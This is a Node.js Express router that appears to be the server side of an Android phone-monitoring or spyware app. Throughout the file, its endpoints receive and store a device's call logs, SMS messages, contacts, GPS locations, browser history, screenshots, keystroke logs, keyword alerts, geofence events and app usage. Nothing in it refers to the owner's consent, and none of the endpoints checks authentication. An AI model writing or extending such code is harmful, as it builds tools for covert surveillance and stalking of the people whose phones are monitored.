const express = require('express');
const router = express.Router();
const Device = require('../models/Device');
const CallLog = require('../models/CallLog');
const Message = require('../models/Message');
const Contact = require('../models/Contact');
const Location = require('../models/Location');
const BrowserHistory = require('../models/BrowserHistory');
const Screenshot = require('../models/Screenshot');
const Keylog = require('../models/Keylog');
const KeywordAlert = require('../models/KeywordAlert');
const Geofence = require('../models/Geofence');
const AppUsage = require('../models/AppUsage');

// Helper: find device by deviceId (string)
const findDevice = async (deviceId) => {
  let device = await Device.findOne({ deviceId });
  if (!device) return null;
  device.lastSeen = new Date();
  await device.save();
  return device;
};

// Register device
router.post('/register', async (req, res) => {
  const { deviceId, deviceName, deviceModel, androidVersion, userId } = req.body;
  try {
    let device = await Device.findOne({ deviceId });
    if (!device) {
      device = new Device({ userId, deviceId, deviceName, deviceModel, androidVersion });
      await device.save();
    } else {
      device.lastSeen = new Date();
      await device.save();
    }
    res.json({ success: true, deviceId: device._id });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload call logs
router.post('/calls', async (req, res) => {
  const { deviceId, calls } = req.body;
  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });
  try {
    for (let call of calls) {
      await CallLog.create({ ...call, deviceId: device._id });
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload messages
router.post('/messages', async (req, res) => {
  const { deviceId, messages } = req.body;
  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });
  try {
    for (let msg of messages) {
      await Message.create({ ...msg, deviceId: device._id });
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload contacts
router.post('/contacts', async (req, res) => {
  const { deviceId, contacts } = req.body;
  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });
  try {
    // Clear old contacts (optional) or upsert
    await Contact.deleteMany({ deviceId: device._id });
    for (let contact of contacts) {
      await Contact.create({ ...contact, deviceId: device._id });
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload location
router.post('/location', async (req, res) => {
  const { deviceId, lat, lng, address, speed } = req.body;
  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });
  try {
    await Location.create({ deviceId: device._id, lat, lng, address, speed, timestamp: new Date() });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload browser history
router.post('/browser', async (req, res) => {
  const { deviceId, history } = req.body;
  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });
  try {
    for (let item of history) {
      await BrowserHistory.create({ ...item, deviceId: device._id });
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload screenshot (base64)
router.post('/screenshot', async (req, res) => {
  const { deviceId, imageBase64 } = req.body;
  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });
  try {
    await Screenshot.create({ deviceId: device._id, imageBase64, timestamp: new Date() });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload keylog
router.post('/keylog', async (req, res) => {
  const { deviceId, appPackage, text } = req.body;
  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });
  try {
    await Keylog.create({ deviceId: device._id, appPackage, text, timestamp: new Date() });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload keyword alert
router.post('/keyword-alert', async (req, res) => {
  const { deviceId, keyword, matchedText, app } = req.body;
  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });
  try {
    await KeywordAlert.create({ deviceId: device._id, keyword, matchedText, app, timestamp: new Date() });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload geofence event
router.post('/geofence', async (req, res) => {
  const { deviceId, name, centerLat, centerLng, radius, triggerEvent } = req.body;
  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });
  try {
    await Geofence.create({ deviceId: device._id, name, centerLat, centerLng, radius, triggerEvent, timestamp: new Date() });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Upload app usage
router.post('/app-usage', async (req, res) => {
  const { deviceId, appPackage, appName, foregroundTime } = req.body;
  const device = await findDevice(deviceId);
  if (!device) return res.status(404).json({ success: false });
  try {
    await AppUsage.create({ deviceId: device._id, appPackage, appName, foregroundTime, timestamp: new Date() });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

module.exports = router;